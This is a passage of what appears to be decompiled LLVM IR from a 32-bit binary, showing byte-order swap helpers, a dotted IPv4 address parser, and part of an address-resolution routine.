  store i32 %v0_f580, i32* %v3_f580, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  %v1_f584 = trunc i32 %v0_f584 to i8
  %v2_f584 = load i32, i32* %r6.global-to-local, align 4
  %v3_f584 = add i32 %v2_f584, 16
  %v4_f584 = inttoptr i32 %v3_f584 to i8*
  store i8 %v1_f584, i8* %v4_f584, align 1
  %v4_f588 = call i32 @function_12a3c(i32 %v1_f564, i32 %v2_f55c, i32 19, i32 %v2_f578)
  %v0_f58c = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f594 = inttoptr i32 %v4_f588 to i8*
  %v3_f594 = call i32 @function_ef70(i8* %v2_f594, i32 %v0_f58c)
  br label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f53c, %dec_label_pc_f56c
  %v0_f598 = phi i32 [ %v3_f550, %dec_label_pc_f53c ], [ %v0_f58c, %dec_label_pc_f56c ]
  store i32 %v3_f53c, i32* @r4, align 4
  store i32 %v6_f53c, i32* @r5, align 4
  ret i32 %v0_f598

; uselistorder directives
  uselistorder i32 %v0_f564, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f598, { 1, 0 }
}

define i32 @function_f5a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5a8:
  %v2_f5c4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f5c4
}

define i32 @function_f5cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5cc:
  %tmp = mul i32 %arg1, 256
  %v1_f5d4 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f5d8 = urem i32 %tmp1, 256
  %v5_f5d8 = or i32 %v4_f5d8, %v1_f5d4
  ret i32 %v5_f5d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5e0:
  %v2_f5fc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f5fc
}

define i32 @function_f604(i32 %arg1) local_unnamed_addr {
dec_label_pc_f604:
  %tmp = mul i32 %arg1, 256
  %v1_f60c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f610 = urem i32 %tmp1, 256
  %v5_f610 = or i32 %v4_f610, %v1_f60c
  ret i32 %v5_f610

; uselistorder directives
  uselistorder i32 65280, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f618(i8* %arg1) local_unnamed_addr {
dec_label_pc_f618:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f624.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f710, %dec_label_pc_f618
  %v1_f6f4 = phi i32 [ %v2_f6fc, %dec_label_pc_f710 ], [ 0, %dec_label_pc_f618 ]
  %v0_f704 = phi i32 [ %v1_f704, %dec_label_pc_f710 ], [ 0, %dec_label_pc_f618 ]
  %v0_f638 = phi i32 [ %v1_f710, %dec_label_pc_f710 ], [ %v0_f624.pre, %dec_label_pc_f618 ]
  %v1_f624 = inttoptr i32 %v0_f638 to i8*
  %v2_f624 = load i8, i8* %v1_f624, align 1
  %v7_f628 = icmp eq i8 %v2_f624, 48
  br i1 %v7_f628, label %dec_label_pc_f638, label %.thread

.thread:                                          ; preds = %dec_label_pc_f624
  br label %.thread9

dec_label_pc_f638:                                ; preds = %dec_label_pc_f624
  %v1_f638 = add i32 %v0_f638, 1
  %v2_f638 = inttoptr i32 %v1_f638 to i8*
  %v3_f638 = load i8, i8* %v2_f638, align 1
  store i32 %v1_f638, i32* %r0.global-to-local, align 4
  %v7_f63c = icmp eq i8 %v3_f638, 88
  br i1 %v7_f63c, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_f638
  %v8_f640 = icmp eq i8 %v3_f638, 120
  br i1 %v8_f640, label %bb59, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb59:                                             ; preds = %dec_label_pc_f638, %bb
  %v2_f64c = add i32 %v0_f638, 2
  store i32 %v2_f64c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb59
  %v0_f6d823 = phi i32 [ %v1_f638, %.thread3 ], [ %v0_f638, %.thread ], [ %v2_f64c, %bb59 ]
  %v0_f6e842 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb59 ]
  %v0_f69c37 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb59 ]
  br label %dec_label_pc_f6d8

dec_label_pc_f660:                                ; preds = %dec_label_pc_f6d8
  %v2_f6e0 = mul nuw nsw i32 %v3_f6d8, 2
  %v2_f664 = load i32, i32* @global_var_205f0, align 4
  %v2_f668 = add i32 %v2_f664, %v2_f6e0
  %v3_f66c = inttoptr i32 %v2_f668 to i8*
  %v4_f66c = load i8, i8* %v3_f66c, align 1
  %v6_f66c = zext i8 %v4_f66c to i32
  %v1_f678 = and i32 %v6_f66c, 8
  %v2_f678 = icmp eq i32 %v1_f678, 0
  br i1 %v2_f678, label %dec_label_pc_f6a8, label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f660
  %tmp84 = icmp ult i8 %v2_f6d8, 56
  br i1 %tmp84, label %.thread11, label %bb62

.thread11:                                        ; preds = %dec_label_pc_f680
  br label %dec_label_pc_f69c

bb62:                                             ; preds = %dec_label_pc_f680
  %v7_f680 = icmp eq i32 %v0_f6a8, 8
  %v2_f694 = icmp eq i1 %v7_f680, false
  br i1 %v2_f694, label %dec_label_pc_f69c, label %dec_label_pc_f720

dec_label_pc_f69c:                                ; preds = %.thread11, %bb62
  %v3_f69c = mul i32 %v1_f6fc, %v0_f69c37
  %v4_f69c = add i32 %v3_f6d8, %v3_f69c
  %v1_f6a0 = add i32 %v4_f69c, -48
  br label %dec_label_pc_f6c8

dec_label_pc_f6a8:                                ; preds = %dec_label_pc_f660
  %v7_f6a8 = icmp eq i32 %v0_f6a8, 16
  br i1 %v7_f6a8, label %dec_label_pc_f6b0, label %dec_label_pc_f6e8

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_f6a8
  %v1_f6b0 = and i32 %v6_f66c, 16
  %v2_f6b0 = icmp eq i32 %v1_f6b0, 0
  br i1 %v2_f6b0, label %dec_label_pc_f6e8, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b0
  %v1_f6b8 = and i32 %v6_f66c, 2
  %tmp81 = mul nuw nsw i32 %v1_f6b8, 16
  %tmp82 = xor i32 %tmp81, 32
  %tmp83 = add nsw i32 %tmp82, -87
  %v4_f6c4 = mul i32 %v1_f6fc, 16
  %v5_f6c4 = add i32 %tmp83, %v4_f6c4
  br label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f69c, %dec_label_pc_f6b8
  %v0_f6a831 = phi i32 [ %v0_f69c37, %dec_label_pc_f69c ], [ 16, %dec_label_pc_f6b8 ]
  %storemerge = phi i32 [ %v1_f6a0, %dec_label_pc_f69c ], [ %v5_f6c4, %dec_label_pc_f6b8 ]
  %v1_f6cc = add i32 %v0_f710, 1
  store i32 %v1_f6cc, i32* %r0.global-to-local, align 4
  %tmp85 = icmp ugt i32 %storemerge, 255
  br i1 %tmp85, label %dec_label_pc_f720, label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6c8, %.thread9
  %v0_f6e8 = phi i32 [ 1, %dec_label_pc_f6c8 ], [ %v0_f6e842, %.thread9 ]
  %v1_f6fc = phi i32 [ %storemerge, %dec_label_pc_f6c8 ], [ 0, %.thread9 ]
  %v0_f6a8 = phi i32 [ %v0_f6a831, %dec_label_pc_f6c8 ], [ %v0_f69c37, %.thread9 ]
  %v0_f710 = phi i32 [ %v1_f6cc, %dec_label_pc_f6c8 ], [ %v0_f6d823, %.thread9 ]
  %v1_f6d8 = inttoptr i32 %v0_f710 to i8*
  %v2_f6d8 = load i8, i8* %v1_f6d8, align 1
  %v3_f6d8 = zext i8 %v2_f6d8 to i32
  %v2_f6dc = icmp eq i8 %v2_f6d8, 0
  br i1 %v2_f6dc, label %dec_label_pc_f6e8, label %dec_label_pc_f660

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6a8, %dec_label_pc_f6d8, %dec_label_pc_f6b0
  %v2_f6d8.lcssa = phi i8 [ %v2_f6d8, %dec_label_pc_f6a8 ], [ 0, %dec_label_pc_f6d8 ], [ %v2_f6d8, %dec_label_pc_f6b0 ]
  %v2_f6dc.lcssa = phi i1 [ false, %dec_label_pc_f6a8 ], [ true, %dec_label_pc_f6d8 ], [ false, %dec_label_pc_f6b0 ]
  %v2_f6e8 = icmp eq i32 %v0_f6e8, 0
  br i1 %v2_f6e8, label %dec_label_pc_f720, label %dec_label_pc_f6f0

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f6e8
  %v2_f6f0 = icmp eq i32 %v0_f704, 0
  br i1 %v2_f6f0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_f6f0
  %v4_f6f4 = mul i32 %v1_f6f4, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_f6f0, %bb65
  %v0_f6fc = phi i32 [ %v1_f6f4, %dec_label_pc_f6f0 ], [ %v4_f6f4, %bb65 ]
  %v7_f6f8 = icmp eq i8 %v2_f6d8.lcssa, 46
  %v2_f6fc = or i32 %v0_f6fc, %v1_f6fc
  br i1 %v7_f6f8, label %dec_label_pc_f704, label %dec_label_pc_f718

dec_label_pc_f704:                                ; preds = %bb66
  %v1_f704 = add i32 %v0_f704, 1
  %v7_f708 = icmp eq i32 %v1_f704, 4
  br i1 %v7_f708, label %dec_label_pc_f720, label %dec_label_pc_f710

dec_label_pc_f710:                                ; preds = %dec_label_pc_f704
  %v1_f710 = add i32 %v0_f710, 1
  store i32 %v1_f710, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f624

dec_label_pc_f718:                                ; preds = %bb66
  br i1 %v2_f6dc.lcssa, label %dec_label_pc_f724, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %dec_label_pc_f704, %dec_label_pc_f6e8, %bb62, %dec_label_pc_f6c8, %dec_label_pc_f718
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f718, %dec_label_pc_f720
  %v0_f724 = phi i32 [ %v2_f6fc, %dec_label_pc_f718 ], [ -1, %dec_label_pc_f720 ]
  store i32 %v0_f724, i32* %r0.global-to-local, align 4
  ret i32 %v0_f724

; uselistorder directives
  uselistorder i32 %v0_f724, { 1, 0 }
  uselistorder i32 %v1_f710, { 1, 0 }
  uselistorder i32 %v1_f704, { 1, 0 }
  uselistorder i8 %v2_f6d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f710, { 0, 2, 1 }
  uselistorder i32 %v0_f6a8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_f69c37, { 1, 2, 0 }
  uselistorder i32 %v2_f64c, { 1, 0 }
  uselistorder i32 %v1_f6f4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 5, 0, 1 }
  uselistorder label %dec_label_pc_f724, { 1, 0 }
  uselistorder label %dec_label_pc_f720, { 4, 0, 1, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f6c8, { 1, 0 }
  uselistorder label %dec_label_pc_f69c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_f730(i32 %arg1) local_unnamed_addr {
dec_label_pc_f730:
  %stack_var_-8 = alloca i32, align 4
  %v2_f734 = ptrtoint i32* %stack_var_-8 to i32
  %v0_f73c = load i32, i32* @r0, align 4
  %v2_f73c = inttoptr i32 %v0_f73c to i8*
  %v3_f73c = call i32 @function_12bf4(i8* %v2_f73c, i32 %v2_f734)
  %v2_f740 = icmp eq i32 %v3_f73c, 0
  br i1 %v2_f740, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f730
  %v3_f748 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f730, %bb
  %v5_f750 = phi i32 [ -1, %dec_label_pc_f730 ], [ %v3_f748, %bb ]
  ret i32 %v5_f750

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f754(i32 %arg1) local_unnamed_addr {
dec_label_pc_f754:
  %stack_var_-12 = alloca i32, align 4
  %v3_f754 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f760 = call i32 @function_11514()
  %v2_f764 = ptrtoint i32* %stack_var_-12 to i32
  %v0_f770 = load i32, i32* @r4, align 4
  %v7_f780 = call i32 @function_f798(i32 %v0_f770, i32* nonnull @global_var_22c44.426, i32 ptrtoint (i32* @global_var_22a78.428 to i32), i32 460, i32 %v2_f764, i32 %v0_f760)
  %v3_f784 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f754, i32* @r4, align 4
  ret i32 %v3_f784
}

define i32 @function_f798(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f798:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_f798 = load i32, i32* @r5, align 4
  %v9_f798 = load i32, i32* @r6, align 4
  %v12_f798 = load i32, i32* @r7, align 4
  %v15_f798 = load i32, i32* @r8, align 4
  %v18_f798 = load i32, i32* @sb, align 4
  %v21_f798 = load i32, i32* @sl, align 4
  %v24_f798 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_f7a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f7a8, i32* @fp, align 4
  %v2_f7a8 = icmp eq i32 %v0_f7a8, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_f7b8 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_f7b8, align 4
  br i1 %v2_f7a8, label %bb, label %dec_label_pc_f7c4

bb:                                               ; preds = %dec_label_pc_f798
  %v1_f7bc = load i32, i32* %r0.global-to-local, align 4
  %v2_f7bc = add i32 %v1_f7bc, 22
  store i32 %v2_f7bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f798
  %v0_f7c4 = call i32 @function_cec4()
  store i32 %v0_f7c4, i32* %r0.global-to-local, align 4
  %v3_f7c8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f7c8, i32* %ip.global-to-local, align 4
  %v1_f7cc = inttoptr i32 %v0_f7c4 to i32*
  %v2_f7cc = load i32, i32* %v1_f7cc, align 4
  store i32 %v2_f7cc, i32* @r8, align 4
  %v0_f7d0 = load i32, i32* @r6, align 4
  store i32 %v0_f7d0, i32* %v1_f7cc, align 4
  %v0_f7d4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_f7c4, i32* @r5, align 4
  %v0_f7e4 = load i32, i32* @fp, align 4
  store i32 %v0_f7e4, i32* %r0.global-to-local, align 4
  %v0_f7e8 = load i32, i32* @sl, align 4
  store i32 %v0_f7e8, i32* %r2.global-to-local, align 4
  %v0_f7ec = load i32, i32* @r7, align 4
  store i32 %v0_f7ec, i32* %r3.global-to-local, align 4
  %v0_f7f0 = load i32, i32* @r4, align 4
  %v7_f7f8 = call i32 @function_137c0(i32 %v0_f7e4, i32 2, i32 %v0_f7e8, i32 %v0_f7ec, i32 %v0_f7f0, i32 %v0_f7d4, i32 %arg6)
  store i32 %v7_f7f8, i32* %r0.global-to-local, align 4
  %v2_f7fc = icmp eq i32 %v7_f7f8, 0
  br i1 %v2_f7fc, label %dec_label_pc_fae8, label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %dec_label_pc_f7c4
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_f808 = inttoptr i32 %arg6 to i32*
  %v2_f808 = load i32, i32* %v1_f808, align 4
  store i32 %v2_f808, i32* %r3.global-to-local, align 4
  %v7_f80c = icmp eq i32 %v2_f808, 1
  br i1 %v7_f80c, label %dec_label_pc_f830, label %dec_label_pc_f814

dec_label_pc_f814:                                ; preds = %dec_label_pc_f804
  %v7_f814 = icmp eq i32 %v2_f808, 4
  br i1 %v7_f814, label %dec_label_pc_f830, label %dec_label_pc_f81c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f814
  %v3_f81c = icmp eq i32 %v2_f808, -1
  br i1 %v3_f81c, label %dec_label_pc_f824, label %dec_label_pc_fae8

dec_label_pc_f824:                                ; preds = %dec_label_pc_f81c
  %v0_f824 = load i32, i32* @r5, align 4
  %v1_f824 = inttoptr i32 %v0_f824 to i32*
  %v2_f824 = load i32, i32* %v1_f824, align 4
  store i32 %v2_f824, i32* %r3.global-to-local, align 4
  %v7_f828 = icmp eq i32 %v2_f824, 2
  br i1 %v7_f828, label %dec_label_pc_f830, label %dec_label_pc_fae8

dec_label_pc_f830:                                ; preds = %dec_label_pc_f824, %dec_label_pc_f814, %dec_label_pc_f804
  %v0_f830 = load i32, i32* @r7, align 4
  %v1_f830 = sub i32 0, %v0_f830
  %v1_f834 = urem i32 %v1_f830, 4
  store i32 %v1_f834, i32* %r3.global-to-local, align 4
  %v2_f834 = icmp eq i32 %v1_f834, 0
  %v0_f838 = load i32, i32* @r8, align 4
  %v1_f838 = load i32, i32* @r5, align 4
  %v2_f838 = inttoptr i32 %v1_f838 to i32*
  store i32 %v0_f838, i32* %v2_f838, align 4
  %v0_f858.pre = load i32, i32* @r4, align 4
  br i1 %v2_f834, label %dec_label_pc_f850, label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_f830
  %v1_f840 = load i32, i32* %r3.global-to-local, align 4
  %v2_f840 = sub i32 %v0_f858.pre, %v1_f840
  %v3_f840 = icmp ult i32 %v0_f858.pre, %v1_f840
  br i1 %v3_f840, label %dec_label_pc_fae4, label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %dec_label_pc_f840
  store i32 %v2_f840, i32* @r4, align 4
  %v0_f84c = load i32, i32* @r7, align 4
  %v2_f84c = add i32 %v0_f84c, %v1_f840
  store i32 %v2_f84c, i32* @r7, align 4
  br label %dec_label_pc_f850

dec_label_pc_f850:                                ; preds = %dec_label_pc_f830, %dec_label_pc_f848
  %v0_f858 = phi i32 [ %v2_f840, %dec_label_pc_f848 ], [ %v0_f858.pre, %dec_label_pc_f830 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_f808, align 4
  %tmp31 = icmp ult i32 %v0_f858, 4
  br i1 %tmp31, label %dec_label_pc_fae4, label %dec_label_pc_f864

dec_label_pc_f864:                                ; preds = %dec_label_pc_f850
  %v0_f864 = load i32, i32* @r4, align 4
  %v1_f864 = add i32 %v0_f864, -4
  store i32 %v1_f864, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_f864, 8
  br i1 %tmp32, label %dec_label_pc_fae4, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f864
  %v1_f870 = add i32 %v0_f864, -12
  store i32 %v1_f870, i32* %r3.global-to-local, align 4
  %v0_f874 = load i32, i32* @r7, align 4
  %v1_f874 = add i32 %v0_f874, 4
  store i32 %v1_f874, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_f880 = inttoptr i32 %v1_f874 to i32*
  store i32 %v0_f874, i32* %v3_f880, align 4
  %v0_f884 = load i32, i32* @r5, align 4
  %v1_f884 = load i32, i32* @sb, align 4
  %v2_f884 = add i32 %v1_f884, 4
  %v3_f884 = inttoptr i32 %v2_f884 to i32*
  store i32 %v0_f884, i32* %v3_f884, align 4
  %tmp33 = icmp ult i32 %v1_f870, 32
  br i1 %tmp33, label %dec_label_pc_fae4, label %dec_label_pc_f88c

dec_label_pc_f88c:                                ; preds = %dec_label_pc_f870
  %v0_f88c = load i32, i32* @r4, align 4
  %v1_f88c = add i32 %v0_f88c, -44
  store i32 %v1_f88c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_f88c, 256
  br i1 %tmp34, label %dec_label_pc_fae4, label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %dec_label_pc_f88c
  %v0_f898 = load i32, i32* @r7, align 4
  %v1_f898 = add i32 %v0_f898, 44
  store i32 %v1_f898, i32* @r6, align 4
  %v1_f89c = add i32 %v0_f898, 12
  store i32 %v1_f89c, i32* %r3.global-to-local, align 4
  %v0_f8a0 = load i32, i32* @fp, align 4
  store i32 %v0_f8a0, i32* @r1, align 4
  store i32 %v1_f88c, i32* %r2.global-to-local, align 4
  store i32 %v1_f898, i32* %r0.global-to-local, align 4
  %v3_f8b0 = call i32 @function_f1d0(i32 %v1_f898, i32 %v0_f8a0, i32 %v1_f88c)
  store i32 %v1_f89c, i32* %ip.global-to-local, align 4
  %v0_f8b8 = load i32, i32* @r6, align 4
  %v1_f8b8 = load i32, i32* @r7, align 4
  %v2_f8b8 = add i32 %v1_f8b8, 12
  %v3_f8b8 = inttoptr i32 %v2_f8b8 to i32*
  store i32 %v0_f8b8, i32* %v3_f8b8, align 4
  %v0_f8bc = load i32, i32* @fp, align 4
  store i32 %v0_f8bc, i32* %r0.global-to-local, align 4
  %v0_f8c0 = load i32, i32* @r5, align 4
  %v1_f8c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_f8c0 = add i32 %v1_f8c0, 4
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i32*
  store i32 %v0_f8c0, i32* %v3_f8c0, align 4
  %v0_f8c4 = load i32, i32* @r7, align 4
  %v2_f8c8 = inttoptr i32 %v0_f8bc to i8*
  %v3_f8c8 = call i32 @function_12bf4(i8* %v2_f8c8, i32 %v0_f8c4)
  store i32 %v3_f8c8, i32* %r0.global-to-local, align 4
  %v2_f8cc = icmp eq i32 %v3_f8c8, 0
  br i1 %v2_f8cc, label %dec_label_pc_f910, label %dec_label_pc_f8d8

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f898
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f8dc = load i32, i32* @sl, align 4
  %v2_f8dc = add i32 %v1_f8dc, 8
  %v3_f8dc = inttoptr i32 %v2_f8dc to i32*
  store i32 2, i32* %v3_f8dc, align 4
  %v0_f8e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8e0 = mul i32 %v0_f8e0, 2
  %v1_f8e4 = load i32, i32* @sl, align 4
  %v2_f8e4 = add i32 %v1_f8e4, 12
  %v3_f8e4 = inttoptr i32 %v2_f8e4 to i32*
  store i32 %v2_f8e0, i32* %v3_f8e4, align 4
  %v3_f8e8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f8e8, i32* %r2.global-to-local, align 4
  store i32 %v1_f89c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_f8f4 = load i32, i32* @r5, align 4
  store i32 %v0_f8f4, i32* %r0.global-to-local, align 4
  %v0_f8f8 = load i32, i32* @sl, align 4
  %v2_f8f8 = inttoptr i32 %v3_f8e8 to i32*
  store i32 %v0_f8f8, i32* %v2_f8f8, align 4
  %v0_f8fc = load i32, i32* @r6, align 4
  %v1_f8fc = load i32, i32* @sl, align 4
  %v2_f8fc = inttoptr i32 %v1_f8fc to i32*
  store i32 %v0_f8fc, i32* %v2_f8fc, align 4
  %v0_f900 = load i32, i32* @sb, align 4
  %v1_f900 = load i32, i32* @sl, align 4
  %v2_f900 = add i32 %v1_f900, 16
  %v3_f900 = inttoptr i32 %v2_f900 to i32*
  store i32 %v0_f900, i32* %v3_f900, align 4
  %v0_f904 = load i32, i32* %r3.global-to-local, align 4
  %v1_f904 = load i32, i32* @sl, align 4
  %v2_f904 = add i32 %v1_f904, 4
  %v3_f904 = inttoptr i32 %v2_f904 to i32*
  store i32 %v0_f904, i32* %v3_f904, align 4
  %v0_f908 = load i32, i32* @r5, align 4
  %v1_f908 = load i32, i32* %ip.global-to-local, align 4
  %v2_f908 = inttoptr i32 %v1_f908 to i32*
  store i32 %v0_f908, i32* %v2_f908, align 4
  br label %dec_label_pc_fae8

dec_label_pc_f910:                                ; preds = %dec_label_pc_f898
  %v2_f910 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_f910, i32* @r5, align 4
  %v1_f914 = call i32 @function_134ec(i32 0)
  store i32 ptrtoint (i32* @global_var_20600.430 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_f910, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_f92c = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20600.430 to i32), i32* %r0.global-to-local, align 4
  %v1_f93c = call i32 @function_10d4c()
  store i32 %v2_f910, i32* @r0, align 4
  %v2_f948 = load i32, i32* @global_var_22f0c.435, align 4
  store i32 %v2_f948, i32* @r4, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_f958 = call i32 @function_10d54()
  %v2_f964 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_22f00.438 to i32), i32* %r3.global-to-local, align 4
  %v0_f970 = load i32, i32* @fp, align 4
  store i32 %v0_f970, i32* %r0.global-to-local, align 4
  %v2_f974 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f974, i32* %ip.global-to-local, align 4
  %v0_f978 = load i32, i32* @r4, align 4
  store i32 %v0_f978, i32* %r2.global-to-local, align 4
  %v6_f98c = inttoptr i32 %v0_f970 to i8*
  %v7_f98c = call i32 @function_12ce0(i8* %v6_f98c, i32 1, i32 %v0_f978, i32 ptrtoint (i32* @global_var_22f00.438 to i32), i32 %v2_f964, i32 %v2_f974)
  store i32 %v7_f98c, i32* %r0.global-to-local, align 4
  %v1_f990 = icmp slt i32 %v7_f98c, 0
  br i1 %v1_f990, label %.dec_label_pc_fabc_crit_edge, label %dec_label_pc_f9a0

.dec_label_pc_fabc_crit_edge:                     ; preds = %dec_label_pc_f910
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_f9a0:                                ; preds = %dec_label_pc_f910
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_f9b4 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_f9b4, 255
  br i1 %tmp35, label %dec_label_pc_fa50, label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f9a0
  %v3_f9bc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f9bc, i32* @r0, align 4
  %v0_f9c0 = call i32 @function_fdcc()
  %v3_f9c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f9c4, i32* @r0, align 4
  %v0_f9c8 = call i32 @function_fdcc()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fa50:                                ; preds = %dec_label_pc_f9a0
  %v3_fa54.pre = load i32, i32* %stack_var_-96, align 4
  %v0_fa58.pre = load i32, i32* @r6, align 4
  store i32 %v1_f9b4, i32* %r2.global-to-local, align 4
  store i32 %v3_fa54.pre, i32* @r1, align 4
  store i32 %v0_fa58.pre, i32* %r0.global-to-local, align 4
  %v3_fa5c = call i32 @function_f1d0(i32 %v0_fa58.pre, i32 %v3_fa54.pre, i32 %v1_f9b4)
  %v3_fa60 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_fa60, i32* @r0, align 4
  %v0_fa64 = call i32 @function_fdcc()
  store i32 %v0_fa64, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_fa6c = icmp eq i32 %tmp7, 1
  br i1 %v7_fa6c, label %dec_label_pc_fa74, label %dec_label_pc_fac8

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa50
  store i32 4, i32* @r2, align 4
  %v0_fa7c = load i32, i32* @r7, align 4
  store i32 %v0_fa7c, i32* @r0, align 4
  %v0_fa80 = call i32 @function_ef60()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_f89c, i32* %r2.global-to-local, align 4
  %v1_fa8c = load i32, i32* @sl, align 4
  %v2_fa8c = add i32 %v1_fa8c, 8
  %v3_fa8c = inttoptr i32 %v2_fa8c to i32*
  store i32 2, i32* %v3_fa8c, align 4
